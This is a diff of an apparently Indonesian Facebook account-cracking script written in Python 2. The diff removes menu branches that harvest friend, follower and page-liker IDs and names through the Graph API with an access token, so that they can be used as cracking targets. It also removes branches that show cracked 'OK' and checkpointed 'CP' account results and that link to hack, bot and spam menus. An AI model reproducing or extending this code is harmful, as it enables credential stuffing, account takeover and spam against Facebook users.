@@ -452,64 +452,6 @@ def pilih_india():
 		print ("\033[1;97mpilih yang benar.......!!!") 
 		exit()
 	elif ask == "1" or ask == "01":
-		print ("\n \033[1;97mketik '\33[3;1m\033[1;96mme\033[1;97m' \33[0;1mjika ingin crack dari daftar pencarian teman")
-		print
-		idt = raw_input(" \033[1;96m[\033[1;97m?\033[1;96m] \033[1;97mid publik :\033[1;93m ")
-		try:
-			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
-			sp = json.loads(pok.text)
-			print (" \033[1;96m[\033[1;97m!\033[1;96m]\033[1;97m nama      :\033[1;93m "+sp["name"]) 
-		except KeyError:
-			print ("     \033[1;97mmaaf id tidak publik") 
-			exit()
-		r = requests.get("https://graph.facebook.com/"+idt+"?fields=friends.fields(id,name)&access_token="+token)
-		z = json.loads(r.text)["friends"]
-		for i in z["data"]:
-			id.append(i["id"]+"<=>"+i["name"])
-	elif ask == "2" or ask == "02":
-		print ("\n \033[1;97mketik '\33[3;1m\033[1;96mme\033[1;97m' \33[0;1mjika ingin crack dari daftar pencarian teman")
-		print
-		idt = raw_input(" \033[1;96m[\033[1;97m?\033[1;96m] \033[1;97mid publik :\033[1;93m ")
-		try:
-			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
-			sp = json.loads(pok.text)
-			print (" \033[1;96m[\033[1;97m!\033[1;96m]\033[1;97m nama      :\033[1;93m "+sp["name"]) 
-		except KeyError:
-			print ("     \033[1;97mmaaf id tidak publik") 
-			exit()
-		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
-		z = json.loads(r.text)
-		for i in z["data"]:
-			id.append(i["id"]+"<=>"+i["name"])
-	elif ask == "3" or ask == "03":
-		idt = raw_input(" \033[1;96m[\033[1;97m?\033[1;96m] \033[1;97mid publik :\033[1;93m ")
-		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token)
-		z = json.loads(r.text)
-		for i in z['data']:
-			uid = i['id']
-			na = i['name']
-			nm = na.rsplit(" ")[0]
-			id.append(uid+'|'+nm)
-	elif ask == "4" or ask == "04":
-		menu_hack()	    
-	elif ask == "5" or ask == "05":
-		print
-		print" \033[1;96m[\033[1;97m1\033[1;96m]\033[1;97m lihat hasil \033[1;97m[\033[1;96mOK\033[1;97m]"
-		print" \033[1;96m[\033[1;97m2\033[1;96m]\033[1;97m lihat hasil \033[1;96m[\033[1;97mCP\033[1;96m]"
-		ress = raw_input(" \033[1;96m[\033[1;97m?\033[1;96m]\033[1;96m pilih \033[1;96m:\033[1;93m ")
-		if ress =="":
-			menu()
-		elif ress == "1" or ress == "01":
-			print ("\n [+] hasil \033[1;97[\033[1;96mOK\033[1;97]\033[1;97m tanggal : \033[1;96m%s-%s-%s\033[0;97m" % (ha, op, ta)) 
-			os.system("cat out/OK-%s-%s-%s.txt" % (ha, op, ta))
-			exit()
-		elif ress == "2" or ress == "02":
-			print (" [+] hasil \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m tanggal : \033[1;96m%s-%s-%s\033[0;97m" % (ha, op, ta)) 
-			os.system("cat out/CP-%s-%s-%s.txt" % (ha, op, ta))
-			exit()
-	elif ask == "6" or ask == "06":
-		buatngecek()
-	elif ask == "1" or ask == "01":
 		print
 		print("\033[1;96m [\033[1;97m1\033[1;96m]\033[1;97m Cek ID teman ")
 		print("\033[1;96m [\033[1;97m2\033[1;96m]\033[1;97m Cek ID publik ")
@@ -523,10 +465,6 @@ def pilih_india():
 		else:
 			print ("\033[1;97mpilih yang benar.......!!!") 
 			exit()
-	elif ask == "8" or ask == "08":
-		 menu_bot()
-	elif ask == "9" or ask == "09":
-		menu_spam()
 	elif ask == "0" or ask == "00":
 		os.system("rm -f login.txt") 
 		print (" √   berhasil menghapus token") 
